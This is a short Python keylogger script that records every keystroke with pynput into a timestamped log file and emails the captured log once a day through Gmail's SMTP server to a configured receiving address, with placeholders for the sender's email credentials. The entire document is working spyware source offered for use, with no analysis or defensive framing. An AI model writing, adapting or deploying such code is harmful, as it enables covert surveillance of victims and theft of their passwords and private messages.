from pynput.keyboard import Key, Listener
import time
import logging
import smtplib

# Enter email credentials
# Access for less secure apps setting has to be turned on in your gmail settings !!!

email = 'Enter your email here '
password = 'Enter your password here '

receiverEmail = 'Enter the email you want to receive the email here'


def send_email(subject, msg):
    try:
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.ehlo()
        server.starttls()
        server.login(email, password)
        message = 'Subject: {}\n\n{}'.format(subject, msg)
        server.sendmail(email, receiverEmail, message)
        server.quit()
        print("Success: ")
    except:
        print("Failed: ")


log_dir = ""

logging.basicConfig(filename=(log_dir + "keylogs.txt"),
                    level=logging.DEBUG, format='%(asctime)s: %(message)s')


def on_press(key):
    logging.info(str(key))


with Listener(on_press=on_press) as listener:
    listener.join()

with open('keylogs.txt', 'r') as f:
    keylogtxt = f.read()

while True:

    time.sleep(86400)

    send_email('Test Subject', keylogtxt)


